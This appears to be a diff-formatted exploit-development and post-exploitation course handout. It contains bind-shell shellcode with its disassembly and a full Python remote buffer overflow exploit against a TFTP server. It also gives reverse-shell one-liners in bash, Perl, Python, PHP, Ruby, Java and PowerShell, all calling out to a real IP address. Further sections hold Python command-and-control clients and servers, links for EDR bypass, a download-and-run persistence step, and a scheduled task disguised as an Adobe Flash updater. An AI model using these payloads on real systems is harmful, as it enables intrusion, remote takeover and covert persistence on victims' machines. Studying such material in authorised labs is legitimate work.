+shellcode += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+shellcode += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+shellcode += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+shellcode += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+shellcode += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+shellcode += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+shellcode += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+shellcode += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+shellcode += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+sys.stdout.write(shellcode)
+---
+ 
+ 
+ 
+python dumpshell.py > bindshell.bin
+ 
+copy bindshellcode.bin into the "c:\Program Files\nasm" directory
+ 
+ 
+ 
+Here we saved the raw shellcode generated by metasploit into a file called bindshell.bin
+317 bindshell.bin
+ 
+---------------------------Type This-----------------------------------
+ 
+C:\Program Files\nasm>ndisasm -b 32 bindshell.bin
+-----------------------------------------------------------------------
+ 
+00000000  FC                cld
+00000001  6AEB              push byte -0x15
+00000003  4D                dec ebp
+00000004  E8F9FFFFFF        call dword 0x2
+00000009  60                pushad
+0000000A  8B6C2424          mov ebp,[esp+0x24]
+0000000E  8B453C            mov eax,[ebp+0x3c]
+00000011  8B7C0578          mov edi,[ebp+eax+0x78]
+00000015  01EF              add edi,ebp
+00000017  8B4F18            mov ecx,[edi+0x18]
+0000001A  8B5F20            mov ebx,[edi+0x20]
+0000001D  01EB              add ebx,ebp
+0000001F  49                dec ecx
+00000020  8B348B            mov esi,[ebx+ecx*4]
+00000023  01EE              add esi,ebp
+00000025  31C0              xor eax,eax
+00000027  99                cdq
+00000028  AC                lodsb
+00000029  84C0              test al,al
+0000002B  7407              jz 0x34
+0000002D  C1CA0D            ror edx,0xd
+00000030  01C2              add edx,eax
+00000032  EBF4              jmp short 0x28
+00000034  3B542428          cmp edx,[esp+0x28]
+00000038  75E5              jnz 0x1f
+0000003A  8B5F24            mov ebx,[edi+0x24]
+0000003D  01EB              add ebx,ebp
+0000003F  668B0C4B          mov cx,[ebx+ecx*2]
+00000043  8B5F1C            mov ebx,[edi+0x1c]
+00000046  01EB              add ebx,ebp
+00000048  032C8B            add ebp,[ebx+ecx*4]
+0000004B  896C241C          mov [esp+0x1c],ebp
+0000004F  61                popad
+00000050  C3                ret
+00000051  31DB              xor ebx,ebx
+00000053  648B4330          mov eax,[fs:ebx+0x30]
+00000057  8B400C            mov eax,[eax+0xc]
+0000005A  8B701C            mov esi,[eax+0x1c]
+0000005D  AD                lodsd
+0000005E  8B4008            mov eax,[eax+0x8]
+00000061  5E                pop esi
+00000062  688E4E0EEC        push dword 0xec0e4e8e
+00000067  50                push eax
+00000068  FFD6              call esi
+0000006A  6653              push bx
+0000006C  66683332          push word 0x3233
+00000070  687773325F        push dword 0x5f327377
+00000075  54                push esp
+00000076  FFD0              call eax
+00000078  68CBEDFC3B        push dword 0x3bfcedcb
+0000007D  50                push eax
+0000007E  FFD6              call esi                     PART 1
+00000080  5F                pop edi
+00000081  89E5              mov ebp,esp
+00000083  6681ED0802        sub bp,0x208
+00000088  55                push ebp
+00000089  6A02              push byte +0x2
+0000008B  FFD0              call eax
+0000008D  68D909F5AD        push dword 0xadf509d9
+00000092  57                push edi
+00000093  FFD6              call esi
+00000095  53                push ebx
+00000096  53                push ebx
+--------------------------------------------CUTCUTCUTCUTCUT----8<---8<---8<---
+00000097  53                push ebx
+00000098  53                push ebx
+00000099  53                push ebx
+0000009A  43                inc ebx
+0000009B  53                push ebx
+0000009C  43                inc ebx
+0000009D  53                push ebx                       PART 2
+0000009E  FFD0              call eax
+000000A0  6668115C          push word 0x5c11
+000000A4  6653              push bx
+000000A6  89E1              mov ecx,esp
+000000A8  95                xchg eax,ebp
+000000A9  68A41A70C7        push dword 0xc7701aa4
+000000AE  57                push edi
+000000AF  FFD6              call esi
+000000B1  6A10              push byte +0x10
+000000B3  51                push ecx
+000000B4  55                push ebp
+000000B5  FFD0              call eax
+000000B7  68A4AD2EE9        push dword 0xe92eada4
+000000BC  57                push edi
+000000BD  FFD6              call esi
+000000BF  53                push ebx
+000000C0  55                push ebp
+000000C1  FFD0              call eax
+000000C3  68E5498649        push dword 0x498649e5
+000000C8  57                push edi
+000000C9  FFD6              call esi
+000000CB  50                push eax
+000000CC  54                push esp
+000000CD  54                push esp
+000000CE  55                push ebp
+000000CF  FFD0              call eax
+000000D1  93                xchg eax,ebx
+000000D2  68E779C679        push dword 0x79c679e7
+000000D7  57                push edi
+000000D8  FFD6              call esi
+000000DA  55                push ebp
+000000DB  FFD0              call eax
+000000DD  666A64            push word 0x64
+000000E0  6668636D          push word 0x6d63
+000000E4  89E5              mov ebp,esp
+000000E6  6A50              push byte +0x50
+000000E8  59                pop ecx
+000000E9  29CC              sub esp,ecx
+000000EB  89E7              mov edi,esp
+000000ED  6A44              push byte +0x44
+000000EF  89E2              mov edx,esp
+000000F1  31C0              xor eax,eax
+000000F3  F3AA              rep stosb
+000000F5  FE422D            inc byte [edx+0x2d]
+000000F8  FE422C            inc byte [edx+0x2c]
+000000FB  93                xchg eax,ebx
+000000FC  8D7A38            lea edi,[edx+0x38]
+000000FF  AB                stosd
+00000100  AB                stosd
+00000101  AB                stosd
+00000102  6872FEB316        push dword 0x16b3fe72
+00000107  FF7544            push dword [ebp+0x44]
+0000010A  FFD6              call esi
+0000010C  5B                pop ebx
+0000010D  57                push edi
+0000010E  52                push edx
+0000010F  51                push ecx
+00000110  51                push ecx
+00000111  51                push ecx
+00000112  6A01              push byte +0x1
+00000114  51                push ecx
+00000115  51                push ecx
+00000116  55                push ebp
+00000117  51                push ecx
+00000118  FFD0              call eax
+0000011A  68ADD905CE        push dword 0xce05d9ad
+0000011F  53                push ebx
+00000120  FFD6              call esi
+00000122  6AFF              push byte -0x1
+00000124  FF37              push dword [edi]
+00000126  FFD0              call eax
+00000128  8B57FC            mov edx,[edi-0x4]
+0000012B  83C464            add esp,byte +0x64
+0000012E  FFD6              call esi
+00000130  52                push edx
+00000131  FFD0              call eax
+00000133  68F08A045F        push dword 0x5f048af0
+00000138  53                push ebx
+00000139  FFD6              call esi
+0000013B  FFD0              call eax
+ 
+-------------------------------------------------------------------------------------------
+Another option would be to go to a website like:
+http://shell-storm.org/online/Online-Assembler-and-Disassembler/
+
+Choose the bottom box and paste the code below into it. Select x86 (32), and make sure that little endian is checked. Then click "Disassemble"
+
+"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+
+
+ 
+ 
+part1 = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+part1 += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+part1 += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+part1 += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+part1 += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+part1 += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+part1 += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+part1 += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+part1 += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+part1 += "\xf5\xad\x57\xff\xd6\x53\x53"
+ 
+ 
+part2 = "\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+part2 += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+part2 += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+part2 += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+part2 += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+part2 += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+part2 += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+part2 += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+part2 += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+part2 += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+part2 += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+ 
+STACK SHIFTER:
+prepend = "\x81\xC4\xFF\xEF\xFF\xFF"  # add esp, -1001h
+prepend += "\x44"                     # inc esp
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---- final script ----
+ 
+#!/usr/bin/python2
+#TFTP Server remote Buffer Overflow
+ 
+import sys
+import socket
+import struct
+ 
+if len(sys.argv) < 2:
+    sys.stderr.write("Usage: tftpd.py <host>\n")
+    sys.exit(1)
+ 
+target = sys.argv[1]
+port = 69
+ 
+eip = 0x7e429353         # jmp esp in USER32.DLL
+ 
+part1 += "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+part1 += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+part1 += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+part1 += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+part1 += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+part1 += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+part1 += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+part1 += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+part1 += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+part1 += "\xf5\xad\x57\xff\xd6\x53\x53"
+ 
+part2 = "\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+part2 += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+part2 += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+part2 += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+part2 += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+part2 += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+part2 += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+part2 += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+part2 += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+part2 += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+part2 += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+prepend = "\x81\xC4\xFF\xEF\xFF\xFF"            # add esp, -1001h
+prepend += "\x44"                               # inc esp
+ 
+buf = "\x00\x01"                        # receive command
+ 
+buf += "\x90" * (256 - len(part2))              # NOPs
+buf += part2                                    # shellcode part 2
+buf += struct.pack('<I', eip)                           # EIP (JMP ESP)
+buf += prepend                                      # stack shifter
+buf += part1                                        # shellcode part 1
+buf += "\xE9" + struct.pack('<i', -380)             # JMP -380
+buf += "\x00"                                       # END
+ 
+# print buf
+ 
+# buf = "\x00\x01"                      # receive command
+ 
+# buf += "A" * 300 + "\x00"
+ 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+try:
+    sock.connect((target, port))
+    sock.sendall(buf)
+except Exception as e:
+    sys.stderr.write("Cannot send to "+str(target)+" : "+str(port)+" : "+str(e)+"!\n")
+finally:
+    sock.close()
+    sys.stderr.write("Sent.\n")
+ 
+ 
+ 
+-----------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+How does all of this actually work
+ 
+ 
+ 
+ 
+Total shellcode length:     315
+   
+                Part1:  150
+                Part2:  165
+ 
+ 
+NOPS * (256 - 165)
+ 
+91 NOPS + (165 bytes shellcode p2) + JMP ESP (4 bytes) + Stack Shift (-1000) + (150 bytes shellcode p1) + (neg jmp -380)
+            |           |                   |
+            256         260                 150 (410)       |
+  |<------------------------------------------------------------------------------------------------------------|                                                                              
+ Jump to the
+ 30 byte mark
+
+
+
+
+
+=================================================================================
+
+
+############################## 
+# Intro to function chaining #
+##############################
+ssh into 192.168.1.117
+username: exploitlab
+password: exploitlab
+
+
+---------------------------Type This-----------------------------------
+cd /home/exploitlab
+cat victim2.c
+make victim2
+./victim2 AAAAAAAAAAAAA
+-----------------------------------------------------------------------
+
+
+
+---------------------------Type This-----------------------------------
+gdb victim2
+disassemble main
+
+break *0x080483cb
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-----------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+bt
+x/i $eip
+x/64x $esp
+
+
+quit
+-----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+cat frame1.pl
+export EGG=`./frame1.pl`
+gdb victim2
+(gdb) run $EGG
+-----------------------------------------------------------------------
+
+
+
+
+
+x/100i 0x80484a5		(looking for a pop/pop/ret)
+quit
+cat frame2.pl
+export EGG=`./frame2.pl`
+gdb victim2
+run $EGG
+
+
+stepi
+
+
+-------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+Lots of reverse shells in different languages
+---------------------------------------------------------------------
+ 
+ 
+ 
+########
+# Bash #
+########
+ 
+---------------------------Type This-----------------------------------
+
+bash -i >& /dev/tcp/45.32.211.184/8080 0>&1
+
+ 
+----------------------------------------------------------------------
+
+****** Note /dev/tcp is usually in Red Hat derivatives and NOT Debian derivatives you want to try /proc/net/tcp instead ***
+ 
+ 
+########
+# Perl #
+########
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+perl -e 'use Socket;$i="45.32.211.184";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ 
+----------------------------------------------------------------------
+
+ 
+
+
+
+---------------------------------------------------------------------- 
+cat perlbackdoor.pl
+#!/usr/bin/perl
+use Socket;
+use FileHandle;
+$IP = $ARGV[0];
+$PORT = $ARGV[1];
+socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(SOCKET, sockaddr_in($PORT,inet_aton($IP)));
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT,">&SOCKET");
+open(STDERR,">&SOCKET");
+system("/bin/sh -i");
+ 
+----------------------------------------------------------------------
+ 
+##########
+# Python #
+##########
+ 
+---------------------------Type This-----------------------------------
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.32.211.184",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+----------------------------------------------------------------------
+ 
+
+
+#######
+# Php #
+#######
+---------------------------Type This-----------------------------------
+ 
+php -r '$sock=fsockopen("45.32.211.184",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+ 
+----------------------------------------------------------------------
+ 
+
+
+########
+# ruby #
+########
+---------------------------Type This-----------------------------------
+ 
+ruby -rsocket -e'f=TCPSocket.open("45.32.211.184",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ 
+----------------------------------------------------------------------
+ 
+ 
+########
+# Java #
+########
+---------------------------Type This-----------------------------------
+ 
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/45.32.211.184/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+ 
+ 
+exec 5<>/dev/tcp/45.32.211.184/1234
+ 
+ 
+cat <&5 | while read line; do $line 2>&5 >&5; done
+ 
+exec 5<>/dev/tcp/45.32.211.184/1234
+ 
+while read line 0<&5; do $line 2>&5 >&5; done
+0<&196;exec 196<>/dev/tcp/45.32.211.184/1234; sh <&196 >&196 2>&196
+ 
+----------------------------------------------------------------------
+****** Note /dev/tcp is usually in Red Hat derivatives and NOT Debian derivatives you want to try /proc/net/tcp instead ***
+
+
+
+
+
+
+
+ 
+##############
+# Powershell #
+##############
+---------------------------Type This-----------------------------------
+ 
+powershell -command "function ReverseShellClean {if ($client.Connected -eq $true) {$client.Close()};  if ($process.ExitCode -ne $null) {$process.Close()};  exit;  };$address = '45.32.211.184';  $port = '1234';$client = New-Object system.net.sockets.tcpclient; $client.connect($address,$port) ;$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize  ;$process = New-Object System.Diagnostics.Process  ;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'  ;$process.StartInfo.RedirectStandardInput = 1  ;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0  ;$process.Start()  ;$inputstream = $process.StandardInput  ;$outputstream = $process.StandardOutput  ;Start-Sleep 1  ;$encoding = new-object System.Text.AsciiEncoding  ;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length)  ;$out = $null; $done = $false; $testing = 0; ;while (-not $done) {if ($client.Connected -ne $true) {cleanup}  ;$pos = 0; $i = 1;  while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);  $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}  ;if ($pos -gt 0){ $string = $encoding.GetString($networkbuffer,0,$pos);  $inputstream.write($string);  start-sleep 1;  if ($process.ExitCode -ne $null) {ReverseShellClean}else {  $out = $encoding.GetString($outputstream.Read()); while($outputstream.Peek() -ne -1){;  $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};  $stream.Write($encoding.GetBytes($out),0,$out.length);  $out = $null;  $string = $null}} else {ReverseShellClean}};"
+ 
+ 
+----------------------------------------------------------------------
+
+**** This shell has been VERY VERY VERY flaky for me - maybe you can figure out what is wrong  *****
+
+
+###############################
+# Reverse Shell in Python 2.7 #
+###############################
+ 
+We'll create 2 python files. One for the server and one for the client.
+ 
+- Below is the python code that is running on victim/client Windows machine:
+ 
+---------------------------Paste This-----------------------------------
+ 
+# Client
+ 
+import socket # For Building TCP Connection
+import subprocess # To start the shell in the system
+ 
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('45.32.211.184',8080))
+ 
+    while True:                         #keep receiving commands
+        command = s.recv(1024)
+ 
+        if 'terminate' in command:
+            s.close() #close the socket
+            break
+ 
+        else:
+ 
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send( CMD.stdout.read()  )  # send the result
+            s.send( CMD.stderr.read()  )  # incase you mistyped a command.
+            # we will send back the error
+ 
+def main ():
+    connect()
+main()
+ 
+ 
+----------------------------------------------------------------------
+ 
+- Below is the code that we should run on server unit, in our case InfosecAddicts Ubuntu machine ( Ubuntu IP: 45.32.211.184 )
+ 
+---------------------------Paste This-----------------------------------
+ 
+# Server
+ 
+import socket # For Building TCP Connection
+ 
+ 
+def connect ():
+ 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("45.32.211.184", 8080))
+    s.listen(1)
+    conn, addr = s.accept()
+    print '[+] We got a connection from:  ', addr
+ 
+ 
+    while True:
+         command = raw_input("Shell> ")
+ 
+         if 'terminate' in command:
+             conn.send('termminate')
+             conn.close()  # close the connection with host
+             break
+ 
+         else:
+             conn.send(command)   #send command
+             print conn.recv(1024)
+ 
+def main ():
+    connect()
+main()
+ 
+----------------------------------------------------------------------
+ 
+- First run server.py code from Ubuntu machine. From command line type:
+ 
+---------------------------Type This-----------------------------------
+ 
+python server.py
+ 
+----------------------------------------------------------------------
+ 
+- then check if 8080 port is open, and if we are listening on 8080:
+ 
+---------------------------Type This-----------------------------------
+ 
+netstat -antp | grep "8080"
+ 
+----------------------------------------------------------------------
+ 
+- Then on victim ( Windows ) unit run client.py code.
+ 
+ 
+- Connection will be established, and you will get a shell on Ubuntu:
+ 
+---------------------------Type This-----------------------------------
+ 
+python server.py
+[+] We got a connection from:   ('192.168.243.1', 56880)
+Shell> arp -a
+ 
+Shell> ipconfig
+ 
+Shell> dir
+----------------------------------------------------------------------
+ 
+ 
+##########################################
+# HTTP based reverse shell in Python 2.7 #
+##########################################
+ 
+ 
+- The easiest way to install python modules and keep them up-to-date is with a Python-based package manager called Pip
+- Download get-pip.py from https://bootstrap.pypa.io/get-pip.py on your Windows machine
+ 
+Then run python get-pip.py from command line. Once pip is installed you may use it to install packages.
+ 
+- Install requests package:
+---------------------------Type This-----------------------------------
+ 
+     python -m pip install requests
+ 
+----------------------------------------------------------------------
+ 
+- Copy and paste below code into client_http.py on your Windows machine:
+ 
+- In my case server/ubuntu IP is 45.32.211.184. You need to change IP to your server address, in both codes (client_http.py, server_HTTP.py)
+ 
+---------------------------Paste This-----------------------------------
+# Client
+ 
+import requests
+import subprocess
+import time
+ 
+ 
+while True:
+    req = requests.get('http://45.32.211.184')
+    command = req.text
+ 
+    if 'terminate' in command:
+        break
+ 
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        post_response = requests.post(url='http://45.32.211.184', data=CMD.stdout.read() )
+        post_response = requests.post(url='http://45.32.211.184', data=CMD.stderr.read() )
+ 
+    time.sleep(3)
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+- Copy and paste below code into server_HTTP.py on your Ubuntu unit (server):
+ 
+ 
+---------------------------Paste This-----------------------------------
+ 
+import BaseHTTPServer
+HOST_NAME = '45.32.211.184'
+PORT_NUMBER = 80
+class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+ 
+    def do_GET(s):
+        command = raw_input("Shell> ")
+        s.send_response(200)
+        s.send_header("Content-type", "text/html")
+        s.end_headers()
+        s.wfile.write(command)
+ 
+ 
+    def do_POST(s):
+        s.send_response(200)
+        s.end_headers()
+        length = int(s.headers['Content-Length'])
+        postVar = s.rfile.read(length)
+        print postVar
+ 
+if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
+ 
+    try:
+        httpd.serve_forever()                            
+    except KeyboardInterrupt:
+        print'[!] Server is terminated'
+        httpd.server_close()
+ 
+----------------------------------------------------------------------
+ 
+- run server_HTTP.py on Ubuntu with next command:
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo python server_HTTP.py
+ 
+----------------------------------------------------------------------
+ 
+ 
+- on Windows machine run client_http.py
+ 
+- on Ubuntu you will see that connection is established:
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo python server_HTTP.py
+Shell> dir
+-----------------------------------------------------------------------
+
+
+
+
+
+
+###############################
+# Device Guard Check & Bypass #
+###############################
+https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-OSiRis.ps1
+
+
+######################
+# EDR Check & Bypass #
+######################
+https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-EDRCheck.ps1
+
+
+
+
+###############
+# Persistance #
+###############
+
+
+---- Scheduled Task Based Persistance ----
+1. Scheduled task based on most commonly occuring event ID
+https://github.com/TestingPens/MalwarePersistenceScripts/blob/master/user_event_persistence.ps1
+
+
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("https://github.com/TestingPens/MalwarePersistenceScripts/blob/master/user_event_persistence.ps1", "c:\persistance\user_event_persistence.ps1")
+
+.\user_event_persistence.ps1
+-------------------------------------------------------------------------
+
+
+
+- Alternative method:
+--------------------
+In this case we will not be running PowerShell. We create a scheduled task definition file called "Adobe Flash Player Updater.xml"
+ 
+- Copy and paste the code below into the "Adobe Flash Player Updater.xml" definition file on target machine:
+- adapt  <UserId></UserId> to SID of current user if you do not have administrative privileges (wmic useraccount where name='user' get sid)
+- adapt  <Command>C:\Windows\System32\calc.exe</Command> to your reverse shell executable
+- this scheduled task triggers on a event, can be changed to regular calls (e.g. once an hour)
+ 
+--------------------------------
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Author>Adobe Systems Incorporated</Author>
+    <Description>This task keeps your Adobe Flash Player installation up to date with the latest enhancements and security fixes. If this task is disabled or removed, Adobe Flash Player will be unable to automatically secure your machine with the latest security fixes.</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <EventTrigger>
+      <Enabled>true</Enabled>
+      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Application"&gt;&lt;Select Path="Application"&gt;*[System[EventID=15]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+    </EventTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
